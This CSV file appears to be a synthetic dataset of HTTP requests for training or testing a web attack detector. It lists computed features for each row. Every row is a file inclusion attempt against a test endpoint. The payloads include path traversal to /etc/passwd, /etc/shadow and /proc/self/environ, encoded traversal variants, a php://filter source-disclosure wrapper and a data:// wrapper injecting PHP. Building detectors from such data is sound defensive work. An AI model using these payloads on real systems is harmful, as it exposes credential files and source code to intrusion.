timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-02T10:10:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.01,10,5,19,0,403,941
2025-01-02T10:11:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.71,13,6,22,0,500,1090
2025-01-02T10:12:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.18,3,4,18,0,403,1068
2025-01-02T10:13:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.56,13,6,22,0,403,975
2025-01-02T10:14:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.42,7,1,28,0,500,1061
2025-01-02T10:15:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.83,13,6,22,0,200,741
2025-01-02T10:16:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.57,13,4,36,0,500,1158
2025-01-02T10:17:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.98,3,4,18,0,403,819
2025-01-02T10:18:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.01,9,5,53,0,500,1044
2025-01-02T10:19:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,3.85,3,4,18,0,500,1142
2025-01-02T10:20:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.36,9,5,53,0,403,926
2025-01-02T10:21:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.23,4,1,21,0,403,967
2025-01-02T10:22:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.23,9,5,53,0,200,1064
2025-01-02T10:23:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.81,10,5,19,0,500,1139
2025-01-02T10:24:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.18,7,1,28,0,500,748
2025-01-02T10:25:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.42,13,6,24,0,403,971
2025-01-02T10:26:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.78,3,4,18,0,403,778
2025-01-02T10:27:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.41,15,7,28,0,500,788
2025-01-02T10:28:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.28,10,1,27,0,500,755
2025-01-02T10:29:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.22,15,7,28,0,200,943
2025-01-02T10:30:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.14,9,5,53,0,403,1148
2025-01-02T10:31:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.77,7,1,28,0,200,1161
2025-01-02T10:32:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.97,13,6,22,0,200,1057
2025-01-02T10:33:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.43,13,6,22,0,200,872
2025-01-02T10:34:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.73,13,6,22,0,200,1002
2025-01-02T10:35:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.38,3,4,18,0,500,855
2025-01-02T10:36:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.86,9,5,53,0,500,1144
2025-01-02T10:37:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.36,7,1,28,0,200,797
2025-01-02T10:38:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.55,3,4,18,0,500,1141
2025-01-02T10:39:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.27,15,7,28,0,500,1199
2025-01-02T10:40:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.49,3,4,18,0,200,1193
2025-01-02T10:41:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.41,7,1,28,0,403,959
2025-01-02T10:42:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.57,13,6,24,0,500,1150
2025-01-02T10:43:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.37,3,4,18,0,200,1093
2025-01-02T10:44:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.32,13,6,22,0,403,1084
2025-01-02T10:45:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.99,10,1,27,0,200,783
2025-01-02T10:46:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.62,3,4,18,0,200,744
2025-01-02T10:47:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.76,10,5,19,0,500,1194
2025-01-02T10:48:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.67,10,5,19,0,403,1058
2025-01-02T10:49:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.79,4,1,21,0,403,1075
2025-01-02T10:50:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.29,3,4,18,0,200,941
2025-01-02T10:51:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.96,13,6,22,0,403,885
2025-01-02T10:52:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.52,13,6,24,0,500,809
2025-01-02T10:53:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.02,10,5,19,0,403,1012
2025-01-02T10:54:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.26,3,4,18,0,403,712
2025-01-02T10:55:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.61,3,4,18,0,500,731
2025-01-02T10:56:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.43,10,5,19,0,403,781
2025-01-02T10:57:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.76,15,7,28,0,200,900
2025-01-02T10:58:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.15,3,4,18,0,500,1040
2025-01-02T10:59:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.08,10,1,27,0,500,847
2025-01-02T11:00:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.74,3,4,18,0,500,1031
2025-01-02T11:01:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,3.95,4,1,21,0,200,1021
2025-01-02T11:02:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,3.85,13,6,24,0,403,1001
2025-01-02T11:03:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.86,13,6,22,0,403,851
2025-01-02T11:04:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.74,15,7,28,0,200,753
2025-01-02T11:05:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.48,13,4,36,0,500,913
2025-01-02T11:06:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.38,13,6,22,0,500,822
2025-01-02T11:07:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.67,9,5,53,0,500,1151
2025-01-02T11:08:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.39,15,7,28,0,500,703
2025-01-02T11:09:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.87,15,7,28,0,200,728
2025-01-02T11:10:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.72,3,4,18,0,403,870
2025-01-02T11:11:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.91,10,1,27,0,500,1081
2025-01-02T11:12:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.57,10,1,27,0,403,764
2025-01-02T11:13:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.64,7,1,28,0,403,933
2025-01-02T11:14:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.46,10,5,19,0,403,843
2025-01-02T11:15:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.57,9,5,53,0,200,1024
2025-01-02T11:16:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.67,4,1,21,0,500,725
2025-01-02T11:17:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.69,13,6,24,0,200,836
2025-01-02T11:18:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.85,15,7,28,0,500,1064
2025-01-02T11:19:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.55,4,1,21,0,403,1061
2025-01-02T11:20:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.18,13,4,36,0,200,1049
2025-01-02T11:21:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.03,3,4,18,0,200,1032
2025-01-02T11:22:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.25,3,4,18,0,200,871
2025-01-02T11:23:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.21,7,1,28,0,500,1033
2025-01-02T11:24:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.28,9,5,53,0,200,962
2025-01-02T11:25:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.8,13,6,24,0,403,829
2025-01-02T11:26:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.5,13,6,22,0,500,1195
2025-01-02T11:27:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.19,7,1,28,0,403,1006
2025-01-02T11:28:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.13,7,1,28,0,403,906
2025-01-02T11:29:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.32,9,5,53,0,500,969
2025-01-02T11:30:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.65,9,5,53,0,403,1104
2025-01-02T11:31:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,3.91,15,7,28,0,200,1006
2025-01-02T11:32:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.55,13,6,22,0,200,863
2025-01-02T11:33:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.51,4,1,21,0,403,986
2025-01-02T11:34:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.31,7,1,28,0,500,965
2025-01-02T11:35:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.06,13,6,22,0,403,785
2025-01-02T11:36:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.26,10,1,27,0,200,799
2025-01-02T11:37:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.8,13,6,22,0,403,1112
2025-01-02T11:38:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.67,13,4,36,0,500,861
2025-01-02T11:39:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.6,4,1,21,0,200,1022
2025-01-02T11:40:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.68,13,4,36,0,403,856
2025-01-02T11:41:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.1,10,5,19,0,403,986
2025-01-02T11:42:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,3.83,9,5,53,0,403,1007
2025-01-02T11:43:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.58,4,1,21,0,403,725
2025-01-02T11:44:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.23,3,4,18,0,200,1099
2025-01-02T11:45:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,3.99,4,1,21,0,403,990
2025-01-02T11:46:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.03,15,7,28,0,200,707
2025-01-02T11:47:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.08,9,5,53,0,500,1017
2025-01-02T11:48:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.43,7,1,28,0,200,872
2025-01-02T11:49:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.4,3,4,18,0,500,735
2025-01-02T11:50:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.79,4,1,21,0,403,1170
2025-01-02T11:51:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.05,15,7,28,0,200,1053
2025-01-02T11:52:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,3.84,9,5,53,0,200,1084
2025-01-02T11:53:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.87,10,1,27,0,500,946
2025-01-02T11:54:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.73,10,5,19,0,500,786
2025-01-02T11:55:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.0,3,4,18,0,500,830
2025-01-02T11:56:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.88,15,7,28,0,200,853
2025-01-02T11:57:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.38,7,1,28,0,403,855
2025-01-02T11:58:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.83,10,1,27,0,500,901
2025-01-02T11:59:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,3.99,10,5,19,0,403,799
2025-01-02T12:00:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.68,13,6,22,0,200,818
2025-01-02T12:01:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.57,9,5,53,0,403,1089
2025-01-02T12:02:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.98,3,4,18,0,500,1101
2025-01-02T12:03:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.27,13,6,22,0,500,1007
2025-01-02T12:04:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.13,4,1,21,0,403,703
2025-01-02T12:05:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.5,9,5,53,0,403,1033
2025-01-02T12:06:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.92,3,4,18,0,200,840
2025-01-02T12:07:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.81,4,1,21,0,403,1020
2025-01-02T12:08:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.95,7,1,28,0,200,920
2025-01-02T12:09:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.0,15,7,28,0,500,870
2025-01-02T12:10:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.14,9,5,53,0,403,1129
2025-01-02T12:11:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.02,3,4,18,0,403,1096
2025-01-02T12:12:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.62,15,7,28,0,200,1168
2025-01-02T12:13:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.74,7,1,28,0,200,759
2025-01-02T12:14:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,3.91,9,5,53,0,403,874
2025-01-02T12:15:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.2,9,5,53,0,403,1123
2025-01-02T12:16:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.66,9,5,53,0,403,1139
2025-01-02T12:17:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.33,13,6,24,0,500,1191
2025-01-02T12:18:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.26,10,5,19,0,200,828
2025-01-02T12:19:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.52,3,4,18,0,500,883
2025-01-02T12:20:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.17,9,5,53,0,200,949
2025-01-02T12:21:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.15,4,1,21,0,500,1000
2025-01-02T12:22:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.69,13,4,36,0,403,1015
2025-01-02T12:23:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.31,13,4,36,0,403,761
2025-01-02T12:24:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.32,7,1,28,0,500,1007
2025-01-02T12:25:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.23,10,5,19,0,500,753
2025-01-02T12:26:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.67,13,4,36,0,403,865
2025-01-02T12:27:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.58,7,1,28,0,200,1185
2025-01-02T12:28:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.56,10,5,19,0,403,1147
2025-01-02T12:29:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.34,10,1,27,0,500,1000
2025-01-02T12:30:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.37,4,1,21,0,403,1010
2025-01-02T12:31:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.84,13,4,36,0,500,774
2025-01-02T12:32:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.96,13,6,22,0,200,930
2025-01-02T12:33:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.77,3,4,18,0,200,708
2025-01-02T12:34:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.19,9,5,53,0,200,859
2025-01-02T12:35:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.51,15,7,28,0,500,1018
2025-01-02T12:36:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.02,13,6,22,0,500,949
2025-01-02T12:37:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.83,13,6,22,0,200,830
2025-01-02T12:38:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,3.87,13,4,36,0,500,842
2025-01-02T12:39:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.4,13,6,22,0,500,780
2025-01-02T12:40:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.19,9,5,53,0,403,878
2025-01-02T12:41:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,3.91,9,5,53,0,500,800
2025-01-02T12:42:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.94,15,7,28,0,500,1031
